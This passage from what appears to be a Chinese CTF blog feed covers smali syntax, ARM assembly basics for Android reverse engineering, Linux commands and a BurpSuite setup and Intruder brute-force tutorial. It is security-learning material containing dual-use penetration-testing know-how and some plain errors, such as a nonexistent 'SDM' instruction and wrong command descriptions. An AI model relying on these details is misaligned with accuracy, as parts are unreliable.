href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">.<span class="function">method <span class="keyword">public</span> <span class="title">statementFor</span><span class="params">()</span>Z</span></div><div class="line">    .locals 4</div><div class="line">    .prologue</div><div class="line">    .line <span class="number">17</span></div><div class="line">    <span class="keyword">const</span>/<span class="number">4</span> v0, <span class="number">0x0</span></div><div class="line">    .local v0, <span class="string">"a"</span>:I</div><div class="line">    :goto_0</div><div class="line">    <span class="keyword">const</span>/<span class="number">16</span> v1, <span class="number">0x64</span></div><div class="line">    <span class="keyword">if</span>-ge v0, v1, :cond_0 <span class="comment">// 结束循环条件</span></div><div class="line">    .line <span class="number">18</span></div><div class="line">    <span class="keyword">const</span>-<span class="built_in">string</span> v1, <span class="string">"StateLoop"</span></div><div class="line">    <span class="keyword">new</span>-instance v2, Ljava/lang/StringBuilder;</div><div class="line">    invoke-direct &#123;v2&#125;, Ljava/lang/StringBuilder;-&gt;&lt;init&gt;()V</div><div class="line">    <span class="keyword">const</span>-<span class="built_in">string</span> v3, <span class="string">""</span></div><div class="line">    invoke-<span class="keyword">virtual</span> &#123;v2, v3&#125;, Ljava/lang/StringBuilder;-&gt;append(Ljava/lang/String;)Ljava/lang/StringBuilder;</div><div class="line">    move-result-object v2</div><div class="line">    invoke-<span class="keyword">virtual</span> &#123;v2, v0&#125;, Ljava/lang/StringBuilder;-&gt;append(I)Ljava/lang/StringBuilder;</div><div class="line">    move-result-object v2</div><div class="line">    invoke-<span class="keyword">virtual</span> &#123;v2&#125;, Ljava/lang/StringBuilder;-&gt;toString()Ljava/lang/String;</div><div class="line">    move-result-object v</div><div class="line">    invoke-<span class="keyword">static</span> &#123;v1, v2&#125;, Landroid/util/Log;-&gt;d(Ljava/lang/String;Ljava/lang/String;)I</div><div class="line">    .line <span class="number">17</span></div><div class="line">    add-<span class="keyword">int</span>/lit8 v0, v0, <span class="number">0x1</span></div><div class="line">    <span class="keyword">goto</span> :goto_0 <span class="comment">// 通过goto实现循环</span></div><div class="line">    .line <span class="number">20</span></div><div class="line">    :cond_0</div><div class="line">    <span class="keyword">const</span>/<span class="number">4</span> v1, <span class="number">0x0</span></div><div class="line">    <span class="keyword">return</span> v1</div><div class="line">.end method</div><div class="line"><span class="keyword">for</span>/foreach循环，<span class="keyword">while</span>/<span class="keyword">do</span>-<span class="keyword">while</span> 几种循环结构smali语法均通过<span class="keyword">goto</span>实现，内部嵌入<span class="keyword">if</span>-xxx 实现跳出循环。</div></pre></td></tr></table></figure><h3 id="try-catch语句"><a href="#try-catch语句" class="headerlink" title="try/catch语句"></a>try/catch语句</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta"># virtual methods</span></div><div class="line">.<span class="function">method <span class="keyword">public</span> <span class="title">statementTry</span><span class="params">()</span>Z</span></div><div class="line">    .locals 4</div><div class="line">    .prologue</div><div class="line">    .line <span class="number">14</span></div><div class="line">    <span class="keyword">const</span>-wide/<span class="number">16</span> v2, <span class="number">0x3e8</span></div><div class="line">    :try_start_0</div><div class="line">    invoke-<span class="keyword">static</span> &#123;v2, v3&#125;, Ljava/lang/Thread;-&gt;sleep(J)V</div><div class="line">    :try_end_0</div><div class="line">    .<span class="keyword">catch</span> Ljava/lang/InterruptedException; &#123;:try_start_0 .. :try_end_0&#125; :catch_0</div><div class="line">    .line <span class="number">18</span></div><div class="line">    :goto_0</div><div class="line">    <span class="keyword">const</span>/<span class="number">4</span> v1, <span class="number">0x1</span></div><div class="line">    <span class="keyword">return</span> v1</div><div class="line">    .line <span class="number">15</span></div><div class="line">    :catch_0</div><div class="line">    move-exception v0</div><div class="line">    .line <span class="number">16</span></div><div class="line">    .local v0, <span class="string">"e"</span>:Ljava/lang/InterruptedException;</div><div class="line">    invoke-<span class="keyword">virtual</span> &#123;v0&#125;, Ljava/lang/InterruptedException;-&gt;printStackTrace()V</div><div class="line">    <span class="keyword">goto</span> :goto_0</div><div class="line">.end method</div></pre></td></tr></table></figure><p>Android参考:<br><a href="http://blog.csdn.net/spy19881201/article/details/5775484" target="_blank" rel="external">http://blog.csdn.net/spy19881201/article/details/5775484</a><br>samli参考:<br><a href="http://blog.csdn.net/chenrunhua/article/details/41250613" target="_blank" rel="external">http://blog.csdn.net/chenrunhua/article/details/41250613</a><br><a href="https://www.cnblogs.com/zhen-android/p/7259434.html" target="_blank" rel="external">https://www.cnblogs.com/zhen-android/p/7259434.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Android与Apk的文件结构在学习逆向很重要的一步。随便记录一下smali语法&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Android_逆向</title>
    <link href="http://yoursite.com/2018/03/08/android_re_1/"/>
    <id>http://yoursite.com/2018/03/08/android_re_1/</id>
    <published>2018-03-08T05:30:56.623Z</published>
    <updated>2018-03-22T03:36:41.265Z</updated>
    
    <content type="html"><![CDATA[<p>以前打比赛的时候就是我负责Android题目的，顺便上传一些工具，IDA7.0等<br><a id="more"></a></p><h1 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h1><p>工具链接：<a href="https://pan.baidu.com/s/1poQEL-RlQgqRLhnfzozbpw" target="_blank" rel="external">https://pan.baidu.com/s/1poQEL-RlQgqRLhnfzozbpw</a> 密码：n6bp</p><h2 id="1、Android"><a href="#1、Android" class="headerlink" title="1、Android"></a>1、Android</h2><p>Android是基于liunx内核的，我们简单看一个hello world的执行过程<br><img src="https://i.imgur.com/NDYNZen.png" alt=""></p><h2 id="2、Android相关的语言"><a href="#2、Android相关的语言" class="headerlink" title="2、Android相关的语言"></a>2、Android相关的语言</h2><p>Java:开发安卓SDK的软件<br>smali:安卓的反汇编语言<br>c/c++:开发安卓NDK的软件，也就是包括so<br>Python:开发脚本插件，开发IDA脚本<br>C#:Unity3d游戏开发<br>Lua:重要的脚本插件或中间语言，在游戏中实用很多<br>JS:开发用于和服务器协议算法相关</p><h2 id="3、ARM汇编基础知识"><a href="#3、ARM汇编基础知识" class="headerlink" title="3、ARM汇编基础知识"></a>3、ARM汇编基础知识</h2><h3 id="1、初识ARM"><a href="#1、初识ARM" class="headerlink" title="1、初识ARM"></a>1、初识ARM</h3><p>Intel8086是英特尔公司的16位处理器，ARM是ARM公司的32位处理器。每个处理器都对应自己的一套汇编语言，所以两个处理器分别对应于8086汇编和ARM汇编。由于处理器的位数，所以8086汇编指令的机器码是16位，而ARM汇编指令的机器码就是32位。机器码可以看作是二进制指令，其实所谓的HEX即称为十六进制操作码或十六进制机器码，也是二进制指令，只是把二进制的数值用十六进制去展示。，如果你会了ARM，就会了主流的嵌入式开发，然后就是硬件编程，然后就是机器人或机械制造。所以,ARM真的非常重要，希望可以去认真学习，不仅是ARM指令集，还有ARM的机器码的原理，以及ELF文件在linux下的objdump反编译。ARM机器码32位，我们以跳转指令BEQ指令为例讲解汇编指令的机器码。</p><p>31-28位，Cond<br>27-25位，101,B指令标识<br>25-24位，Link<br>23-0位，Offset,跳转处与当前指令差值</p><p>例：<br>00001BD0 BRQ loc_1C04<br>Cond:0000,表示EQ<br>101,B系列指令固定标识<br>L:0,表示不需要保存下一条指令<br>Offset:该值位0x1C04-0x1BD0=0000 0000 0000 0000 0000 1011<br>整体为：0000 1010 0000 0000 0000 0000 0000 1011<br>        Cond B+Link        Offset<br>0A 00 00 0B<br>再根据汇编倒序特点,显示为0B 00 00 0A</p><h3 id="2、ARM与Thumb、Thunmb2指令"><a href="#2、ARM与Thumb、Thunmb2指令" class="headerlink" title="2、ARM与Thumb、Thunmb2指令"></a>2、ARM与Thumb、Thunmb2指令</h3><p>当我们把SO里的汇编语言放到工具中去转换为HEX时，会发现和IDA中的HEX有时是完全不同的，这是因为IDA中有时反编译SO使用的不是ARM，而是16位的ARM，也就是Thumb指令，但有时却是ARM的32位指令。其实对于指令集的判断应该看机器码，当机器码第5位statebit值位1为Thumb指令集，当为0时位ARM指令集。Thunmb2指令为32位，只有当15-13位为111,12-11位不为00的情况下才是。如同beq,bne这两个汇编指令，用ARM的4个HEX表示时，其实HEX的值位0A,1A,而当用2个HEX数表示时，其HEX值为D0,D1。有时候动态调试的时候需要手工IDA转为Thumb指令</p><h3 id="3、ARM的寄存器"><a href="#3、ARM的寄存器" class="headerlink" title="3、ARM的寄存器"></a>3、ARM的寄存器</h3><p>首先以标准ARM指令来看，有R0-R15个寄存器<br>R0-R7:通用寄存器<br>R8-R10:不通用寄存器<br>R15:程序计数器(PC)，相当重要的一个寄存器，可以实现地址跳转，记的不是数，而是地址，直接关系着系统中断<br>R13:堆栈指针(SP)<br>R14:链接寄存器(LR)<br>R11:基址指针(FP)<br>R12:暂时寄存器(IP)<br>CPSR:状态寄存器</p><h3 id="4、ARM的指令"><a href="#4、ARM的指令" class="headerlink" title="4、ARM的指令"></a>4、ARM的指令</h3><p>CMP:比较<br>CMP R0,#0  (R0寄存器中的值与0比较 标志位z=0,表示相等，在动态调试中可以看到)</p><p>LDR: 从存储器中加载数据到寄存器 &lt;–Load<br>LDR R0,[R9,#04] 将R9+0x04指向存储单元的值赋给R0</p><p>STR: 将寄存器的数据存储到存储器 –&gt; Store<br>STR R0,[R9,#04] R0的值存储到R9+0x04指向存储单元</p><p>LDM: 将寄存器的数据加载到一个寄存器列表<br>LDM R0,{R1-R3} 将R0的数据依次加载到R1,R2,R3寄存器</p><p>SDM: 一个寄存器列表的数据存储到指定寄存器<br>SDM R0,{R1-R3}</p><p>PUSH: 将寄存器值压入堆栈中<br>POP:  将堆栈中的数据推出到寄存器</p><p>ADD,SUB,MUL,DIV 加减乘除</p><p>AND,ORR,EOR 与，或，异或</p><p>LSL 逻辑左移<br>LSR 逻辑右移</p><p>LSL R0,R1,#2  R0=R1*4</p><h3 id="5、ARM寻址方式"><a href="#5、ARM寻址方式" class="headerlink" title="5、ARM寻址方式"></a>5、ARM寻址方式</h3><p>1). 寄存器：    MOV R1,R2 ; R2-&gt;R1<br>2). 立即数：    SUBS R0,R1,#1; R0=R1-1<br>3). 寄存器移位：MOV R0,R2,LSL #3 ;R2左移三位-&gt;R0<br>4). 间接寻址：  LDR R1,[R2] ; 装载R2指向的内存数值至R1<br>5). 基址寻址：  LDR R2,[R3,#0x0F] ;R3+0x0F作为地址，将所</p><h3 id="6、函数传参"><a href="#6、函数传参" class="headerlink" title="6、函数传参"></a>6、函数传参</h3><p>一般从R0-R3,多于4个参数便会压入栈中</p><h1 id="Liunx"><a href="#Liunx" class="headerlink" title="Liunx"></a>Liunx</h1><p>由于Android是基于liunx内核的</p><h2 id="1、什么是Liunx"><a href="#1、什么是Liunx" class="headerlink" title="1、什么是Liunx"></a>1、什么是Liunx</h2><p>Linux是一套免费使用和自由传播的类Unix操作系统，是一个基于POSIX和UNIX的多用户、多任务、支持多线程和多CPU的操作系统。它能运行主要的UNIX工具软件、应用程序和网络协议。它支持32位和64位硬件。Linux继承了Unix以网络为核心的设计思想，是一个性能稳定的多用户网络操作系统，诞生于1991年10月5日。</p><h2 id="2、Liunx的特点"><a href="#2、Liunx的特点" class="headerlink" title="2、Liunx的特点"></a>2、Liunx的特点</h2><p>1、一切都是文件(就是系统中的所有都归结为一个文件，包括命令、硬件和软件设备、操作系统、进程等等对于操作系统内核而言，都被视为拥有各自特性或类型的文件)。<br>2、Linux在内存管理优势：Windows是只在需要内存时，才为应用程序分配内存；Linux 无论物理内存有多大，都将其充份利用。<br>3、不需要整理磁盘碎片<br>4、每个软件都有确定的用途</p><h2 id="3、Liunx文件"><a href="#3、Liunx文件" class="headerlink" title="3、Liunx文件"></a>3、Liunx文件</h2><h3 id="1、文件系统"><a href="#1、文件系统" class="headerlink" title="1、文件系统"></a>1、文件系统</h3><p>1、普通文件:就是一般存取的文件，由ls -al显示出来的属性中，第一个属性为 [-]，例如 [-rwxrwxrwx]。<br>2、目录文件（directory）:就是目录，第一个属性为 [d]，例如 [drwxrwxrwx]。<br>3、连接文件（link）:类似Windows下面的快捷方式。第一个属性为 [l]，例如 [lrwxrwxrwx]。<br>4、设备与设备文件（device）:系统外设及存储等相关的一些文件，通常都集中在 /dev目录。通常又分为两种：块设备文件：就是存储数据以供系统存取的接口设备，简单而言就是硬盘。例如一号硬盘的代码是 /dev/hda1等文件。第一个属性为 [b]。字符设备文件：即串行端口的接口设备，例如键盘、鼠标等等。第一个属性为 [c]<br>5、套接字（sockets）：这类文件通常用在网络数据连接。可以启动一个程序来监听客户端的要求，客户端就可以通过套接字来进行数据通信。第一个属性为 [s]，最常在 /var/run目录中看到这种文件类型。<br>6、管道（FIFO,pipe）：FIFO也是一种特殊的文件类型，它主要的目的是，解决多个程序同时存取一个文件所造成的错误。FIFO是first-in-first-out（先进先出）的缩写。第一个属性为 [p]。[</p><h3 id="2、文件结构"><a href="#2、文件结构" class="headerlink" title="2、文件结构"></a>2、文件结构</h3><p>/：根目录，所有的目录、文件、设备都在/之下，/就是Linux文件系统的组织者，也是最上级的领导者。<br>根目录下一层一般有基础的15个目录:bin,boot,dev,etc,lib,media,mnt,opt,root,sbin,srv,tmp,usr,var<br><img src="https://i.imgur.com/5WK2k5M.png" alt=""><br>/etc：etc这个目录是linux系统中最重要的目录之一。在这个目录下存放了系统管理时要用到的各种配置文件和子目录。要用到的网络配置文件，文件系统，x系统配置文件，设备配置信息，设置用户信息等都在这个目录下。<br>/var：这个目录的内容是经常变动的，看名字就知道，可以理解为vary的缩写，/var下有/var/log 这是用来存放系统日志的目录。/var/ www目录是定义Apache服务器站点存放目录；/var/lib 用来存放一些库文件，比如MySQL的，以及MySQL数据库的的存放地。<br>/mnt：这个目录一般是用于存放挂载储存设备的挂载目录的，比如有cdrom等目录。可以参看/etc/fstab的定义<br>/usr/local：这里主要存放那些手动安装的软件，即不是通过“新立得”或apt-get安装的软件。它和/usr目录具有相类似的目录结构。让软件包管理器来管理/usr目录，而把自定义的脚本（scripts)放到/usr/local目录下面、。</p><h3 id="3、文件操作"><a href="#3、文件操作" class="headerlink" title="3、文件操作"></a>3、文件操作</h3><p>cd-切换；<br>pwd-显示当前目录；<br>mkdir-新建一个新目录；<br>rmdir-删除一个空目录；<br>ls-查看文件目录；<br>cp-复制文件；<br>rm-删除文件；<br>mv-移动文件</p><h2 id="4、Liunx常用命令及技巧"><a href="#4、Liunx常用命令及技巧" class="headerlink" title="4、Liunx常用命令及技巧"></a>4、Liunx常用命令及技巧</h2><p>一。 通用命令:</p><ol><li>date ：print or set the system date and time<br>　　2. stty -a: 可以查看或者打印控制字符(Ctrl-C, Ctrl-D, Ctrl-Z等)<br>　　3. passwd: print or set the system date and time (用passwd -h查看)<br>　　4. logout, login: 登录shell的登录和注销命令<br>　　5. pwd: print or set the system date and time<br>　　6. more, less, head tail: 显示或部分显示文件内容.<br>　　7. lp/lpstat/cancel, lpr/lpq/lprm: 打印文件.<br>　　8. 更改文件权限： chmod u+x…<br>　　9. 删除非空目录：rm -fr dir<br>　　10.拷贝目录： cp -R dir<br>　　11. fg jobid :可以将一个后台进程放到前台。<br>　　Ctrl-z 可以将前台进程挂起(suspend), 然后可以用bg jobid 让其到后台运行。<br>　　job &amp; 可以直接让job直接在后台运行。<br>　　12. kill 的作用: send a signal to a process. eg: kill -9 发送的是SIG_KILL信号。。。 具体发送什么信号 可以通过 man kill 查看。<br>　　13. ps 的用法， ps -e 或 ps -o pid,ppid,session,tpgid, comm (其中session显示的sessionid, tpgid显示前台进程组id, comm显示命令名称。)<br>二 .ubuntu常用命令:</li><li>dpkg: package manager for Debian<br>　　<em> 安装： dpkg -i package　　</em> 卸载： dpkg -r package<br>　　<em> 卸载并删除配置文件: dpkg -P |–purge package　　</em> 如果安装一个包时。说依赖某些库。 可以先 apt-get install somelib…<br>　　<em> 查看软件包安装内容 :dpkg -L package　　</em> 查看文件由哪个软件包提供: dpkg -S filename<br>　　* 另外 dpkg还有 dselect和aptitude 两个frontend.</li><li>apt<br>　　<em> 安装: apt-get install packs　　</em> apt-get update : 更新源<br>　　<em> apt-get upgrade: 升级系统。　　</em> apt-get dist-upgrade: 智能升级。安装新软件包,删除废弃的软件包<br>　　<em> apt-get -f install ： -f == –fix broken 修复依赖　　</em> apt-get autoremove: 自动删除无用的软件<br>　　<em> apt-get remove packages :删除软件　　</em> apt-get remove package –purge 删除包并清除配置文件<br>　　<em> 清除所以删除包的残余配置文件: dpkg -l |grep ^rc|awk ‘{print $2}’ |tr [“/n”] [“ “]|sudo xargs dpkg -P　　</em> 安装软件时候包的临时存放目录 : /var/cache/apt/archives<br>　　<em> 清除该目录: apt-get clean　　</em> 清除该目录的旧版本的软件缓存: apt-get autoclean<br>　　<em> 查询软件some的依赖包： apt-cache depends some　　</em> 查询软件some被哪些包依赖: apt-get rdepends some<br>　　<em> 搜索软件: apt-cache search name|regexp　　</em> 查看软件包的作用：apt-cache show package<br>　　<em> 查看一个软件的编译依赖库: apt-cache showsrc packagename|grep Build-Depends　　</em> 下载软件的源代码 : apt-get source packagename (注: sources.list 中应该有 deb-src 源)<br>　　<em> 安装软件包源码的同时, 安装其编译环境 :apt-get build-dep packagename (有deb-src源)　　</em> 如何将本地光盘加入安装源列表: apt-cdrom add</li><li>系统命令:<br>　　<em> 查看内核版本： uname -a　　</em> 查看ubuntu 版本: cat /etc/issue<br>　　<em> 查看网卡状态 : ethtool eth0　　</em> 查看内存,cpu的信息： cat /proc/meminfo ; cat /proc/cpuinfo<br>　　(/proc下面的有很多系统信息)<br>　　<em> 打印文件系统空间使用情况: df -h　　</em> 查看硬盘分区情况: fdisk -l<br>　　<em> 产看文件大小: du -h filename;　　</em> 查看目录大小： du -hs dirname ; du -h dirname是查看目录下所有文件的大小<br>　　<em> 查看内存的使用： free -m|-g|-k　　</em> 查看进程： ps -e 或ps -aux –&gt;显示用户<br>　　<em> 杀掉进程: kill pid　　</em> 强制杀掉： killall -9 processname</li><li>网络相关：<br>　　<em> 配置 ADSL: sudo pppoeconf　　</em> ADSL手工拨号: sudo pon dsl-provider<br>　　<em> 激活 ADSL : sudo /etc/ppp/pppoe_on_boot　　</em> 断开 ADSL: sudo poff<br>　　<em> 根据IP查网卡地址: arping IP地址　　</em> 产看本地网络信息（包括ip等）: ifconfig | ifconfig eth0<br>　　<em> 查看路由信息: netstat -r　　</em> 关闭网卡： sudo ifconfig eth0 down<br>　　<em> 启用网卡： sudo ifconfig eth0 up　　</em> 添加一个服务: sudo update-rc.d 服务名 defaults 99<br>　　<em> 删除一个服务: sudo update-rc.d 服务名 remove　　</em> 临时重启一个服务: /etc/init.d/服务名 restart<br>　　<em> 临时关闭一个服务: /etc/init.d/服务名 stop　　</em> 临时启动一个服务: /etc/init.d/服务名 start<br>　　<em> 控制台下显示中文: sudo apt-get install zhcon　　</em> 查找某个文件: whereis filename 或 find 目录 -name 文件名<br>　　*通过ssh传输文件<br>　　scp -rp /path/filename username@remoteIP:/path #将本地文件拷贝到服务器上<br>　　scp -rp username@remoteIP:/path/filename /path #将远程文件从服务器下载到本地</li><li>压缩:<br>　　<em>解压缩 a.tar.gz: tar zxvf a.tar.gz　　</em>解压缩 a.tar.bz2: tar jxvf a.tar.bz2<br>　　<em>压缩aaa bbb目录为xxx.tar.gz: tar zcvf xxx.tar.gz aaa bbb　　</em>压缩aaa bbb目录为xxx.tar.bz2: tar jcvf xxx.tar.bz2 aaa bbb[6] </li><li>Nautilus：<br>　　特殊 URI 地址<br>　　<em> computer:/// - 全部挂载的设备和网络　　</em> network:/// - 浏览可用的网络<br>　　<em> burn:/// - 一个刻录 CDs/DVDs 的数据虚拟目录　　</em> smb:/// - 可用的 windows/samba 网络资源<br>　　<em> x-nautilus-desktop:/// - 桌面项目和图标　　</em> file:/// - 本地文件<br>　　<em> trash:/// - 本地回收站目录　　</em> ftp:// - FTP 文件夹<br>　　<em> ssh:// - SSH 文件夹　　</em> fonts:/// - 字体文件夹，可将字体文件拖到此处以完成安装<br>　　<em> themes:/// - 系统主题文件夹　　</em> 显示隐藏文件: Ctrl+h<br>　　<em> 显示地址栏: Ctrl+l　　</em> 查看已安装字体: 在nautilus的地址栏里输入”fonts:///“，就可以查看本机所有的fonts[6]<br>7.补充部分：</li></ol><ul><li>查看本地所有的tpc,udp监听端口: netstat -tupln (t=tcp, u=udp, p=program, l=listen, n=numric)<br>　　<em> 通过man搜说相关命令: man -k keyword . eg: man -k user　　</em> 或者用 apropos<br>　　<em> 统计文件所占用的实际磁盘空间： du (du - estimate file space usage)　　</em> 统计文件中的字符，字节数: wc -c/-l/-w (wc - print the number of newlines, words, and bytes in files)<br>　　<em> 查看文件的内容： od -x/-c/…. (od - dump files in octal and other formats)<br>　　我认为od最有用的就是文件的字节流了: od -t x1 filename<br>　　查看文件的 Ascii 码形式: od -t c filename (其中统计信息最左边的是： 字节数)　　</em> 查找命令所在文件的位置： which od 输出： /usr/bin/od<br>　　查看该文件由哪个包提供： dpkg -S /usr/bin/od 输出: coreutils: /usr/bin/od<br>　　再查看coreutils包的全部内容就知道了linux的核心命令: dpkg -L coreutils<br>　　然后 info coreutils 哈哈，认真学吧， 满世界都是命令!<br>　　<em> 可以用man 命令产看某个命令的所有section 的解释: man -a tty<br>　　然后用q,和next 转换到下一个section的解释　　</em> bash 的好用的快捷键:<br>　　ctrl+a:光标移到行首。<br>　　ctrl+b:光标左移一个字母<br>　　ctrl+c:杀死当前进程。<br>　　ctrl+d:退出当前 Shell。<br>　　ctrl+e:光标移到行尾。<br>　　ctrl+h:删除光标前一个字符，同 backspace 键相同。<br>　　ctrl+k:清除光标后至行尾的内容。<br>　　ctrl+l:清屏，相当于clear。<br>　　ctrl+r:搜索之前打过的命令。会有一个提示，根据你输入的关键字进行搜索bash的history<br>　　ctrl+u: 清除光标前至行首间的所有内容。<br>　　ctrl+w: 移除光标前的一个单词<br>　　ctrl+t: 交换光标位置前的两个字符<br>　　ctrl+y: 粘贴或者恢复上次的删除<br>　　ctrl+d: 删除光标所在字母;注意和backspace以及ctrl+h的区别，这2个是删除光标前的字符<br>　　ctrl+f: 光标右移<br>　　ctrl+z : 把当前进程转到后台运行，使用’ fg ‘命令恢复。比如top -d1 然后ctrl+z ，到后台，然后fg,重新恢复<br>　　<em> 快速粘贴：先在一个地方选中文字，在欲粘贴的地方按鼠标 中键 即可。　　</em> 等效中键：a 、按下滑轮等效于中键。b、同时按下鼠标 左右键，等效于中键。<br>　　<em> 快速重启X服务： 同时按下： Alt + Ctrl + Backspace 三个键。　　</em> 打开”运行”窗口： 同时按下 Alt + F2 键。<br>　　<em> 戴屏： a、全屏：直接按下 PrtScr 键。<br>　　b、当前窗口：同时按下 Alt + PrtScr 键。<br>　　c、延时戴屏：在 终端 或 “运行”窗口中输入命令： gnome-screenshot –delay 3 ，将延时 3 秒后戴屏。　　</em> 直接将 文件管理器 中的文件拖到 GNOME终端 中就可以在终端中得到完整的路径名。[6]  8.ulimit<br>　　ulimit：显示（或设置）用户可以使用的资源的限制（limit），这限制分为软限制（当前限制）和硬限制（上限），其中硬限制是软限制的上限值，应用程序在运行过程中使用的系统资源不超过相应的软限制，任何的超越都导致进程的终止。<br>　　ulimited 不限制用户可以使用的资源，但本设置对可打开的最大文件数（max open files）<br>　　和可同时运行的最大进程数（max user processes）无效<br>　　-a 列出所有当前资源极限<br>　　-c 设置core文件的最大值.单位:blocks<br>　　-d 设置一个进程的数据段的最大值.单位:kbytes<br>　　-f Shell 创建文件的文件大小的最大值，单位：blocks<br>　　-h 指定设置某个给定资源的硬极限。如果用户拥有 root 用户权限，可以增大硬极限。任何用户均可减少硬极限<br>　　-l 可以锁住的物理内存的最大值<br>　　-m 可以使用的常驻内存的最大值,单位：kbytes<br>　　-n 每个进程可以同时打开的最大文件数<br>　　-p 设置管道的最大值，单位为block，1block=512bytes<br>　　-s 指定堆栈的最大值：单位：kbytes<br>　　-S 指定为给定的资源设置软极限。软极限可增大到硬极限的值。如果 -H 和 -S 标志均未指定，极限适用于以上二者<br>　　-t 指定每个进程所使用的秒数,单位：seconds<br>　　-u 可以运行的最大并发进程数<br>　　-v Shell可使用的最大的虚拟内存，单位：kbytes<br>　　eg: ulimit -c 1000(可以先通过ulimit -c 查看原来的值)</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;以前打比赛的时候就是我负责Android题目的，顺便上传一些工具，IDA7.0等&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>BurpSuite从安装到&quot;放弃&quot;</title>
    <link href="http://yoursite.com/2018/01/29/web_bp/"/>
    <id>http://yoursite.com/2018/01/29/web_bp/</id>
    <published>2018-01-29T05:18:04.339Z</published>
    <updated>2018-03-07T14:51:42.617Z</updated>
    
    <content type="html"><![CDATA[<p>以前也用过这个工具，不过没有好好的用，很多功能还不是很了解，现在嘛，发现它真的是个神器，好好的学习(其实为了以后找工作，毕竟以后还是会用到这个的呀)，<br><a id="more"></a></p><h1 id="一、BurpSuite是啥"><a href="#一、BurpSuite是啥" class="headerlink" title="一、BurpSuite是啥"></a>一、BurpSuite是啥</h1><p>如果你是打过ctf比赛的，那下面这段直接跳过。它由Java语言编写，是一个集成化的渗透测试工具，它集合了多种渗透测试组件，使我们自动化地或手工地能更好的完成对web应用的渗透测试和攻击。</p><h2 id="常用的功能：抓包、重放、爆破"><a href="#常用的功能：抓包、重放、爆破" class="headerlink" title="常用的功能：抓包、重放、爆破"></a>常用的功能：抓包、重放、爆破</h2><h1 id="二、安装BurpSuite"><a href="#二、安装BurpSuite" class="headerlink" title="二、安装BurpSuite"></a>二、安装BurpSuite</h1><h2 id="1-、首先你的电脑上有java环境，然后下载BurpSuite"><a href="#1-、首先你的电脑上有java环境，然后下载BurpSuite" class="headerlink" title="(1)、首先你的电脑上有java环境，然后下载BurpSuite"></a>(1)、首先你的电脑上有java环境，然后下载BurpSuite</h2><p>在命令控制端输入java,如果是这样，就有java环境，否则自己去安装吧。<br><img src="https://i.imgur.com/qgJuZgp.png" alt=""><br>下载Bp<br>链接：<a href="https://pan.baidu.com/s/10Jq0P5n67VdIZuNZLgj2SQ" target="_blank" rel="external">https://pan.baidu.com/s/10Jq0P5n67VdIZuNZLgj2SQ</a> 密码：rc69</p><h2 id="2-、向浏览器中导入证书"><a href="#2-、向浏览器中导入证书" class="headerlink" title="(2)、向浏览器中导入证书"></a>(2)、向浏览器中导入证书</h2><p>向bp中导入证书<br><img src="https://i.imgur.com/WsAHe0R.png" alt=""><br><img src="https://i.imgur.com/JMqKwA3.png" alt=""><br><img src="https://i.imgur.com/yV1IvtF.png" alt=""><br>向浏览器中导入证书<br><img src="https://i.imgur.com/nwP1HfW.png" alt=""><br><img src="https://i.imgur.com/6z8OAOQ.png" alt=""></p><h2 id="3-、运行，截断流量成功"><a href="#3-、运行，截断流量成功" class="headerlink" title="(3)、运行，截断流量成功"></a>(3)、运行，截断流量成功</h2><p><img src="https://i.imgur.com/TfkzHVJ.png" alt=""><br><img src="https://i.imgur.com/u01CBgq.png" alt=""></p><h1 id="三、功能介绍"><a href="#三、功能介绍" class="headerlink" title="三、功能介绍"></a>三、功能介绍</h1><h2 id="1、Proxy-代理-，提供一个直观、友好的用户界面，他的代理服务器包含非常详细的拦截规则，并能准确分析HTTP-消息的结构与内容"><a href="#1、Proxy-代理-，提供一个直观、友好的用户界面，他的代理服务器包含非常详细的拦截规则，并能准确分析HTTP-消息的结构与内容" class="headerlink" title="1、Proxy(代理)，提供一个直观、友好的用户界面，他的代理服务器包含非常详细的拦截规则，并能准确分析HTTP 消息的结构与内容"></a>1、Proxy(代理)，提供一个直观、友好的用户界面，他的代理服务器包含非常详细的拦截规则，并能准确分析HTTP 消息的结构与内容</h2><p>选项Intercept<br><img src="https://i.imgur.com/4MNx4YP.png" alt=""><br>选项option<br><img src="https://i.imgur.com/XfBr0dN.png" alt=""></p><h2 id="2、Intruder-爆破-，定制攻击自动化"><a href="#2、Intruder-爆破-，定制攻击自动化" class="headerlink" title="2、Intruder(爆破)，定制攻击自动化"></a>2、Intruder(爆破)，定制攻击自动化</h2><p>抓包发送到Intruder处<br><img src="https://i.imgur.com/ScC0zjg.png" alt=""><br>工具已经自动为我们创造了有效载荷测试的位置。有效载荷的位置使用§符号作为每个有针对性的攻击位置的起始和结束标记。你想测试的位置前后用§§符号进行标示。然后设置攻击类型<br>Sniper 这种攻击模式可以让我们选择的攻击位置注入一个单一的有效载荷。<br>Pitchfork 这种攻击模式允许你测试多种有效载荷，最大能够自定义8 个，基于攻击位置<br>Cluster bomb 这种攻击模式使用多种有效载荷，并允许你测试每一个可能有效载荷在每个选择的攻击位置，这意味着接下来的测试，交换任何其他有效载荷。当你有不同需要注射的地方，它将会非常的方便。<br><img src="https://i.imgur.com/82tMppA.png" alt=""><br><img 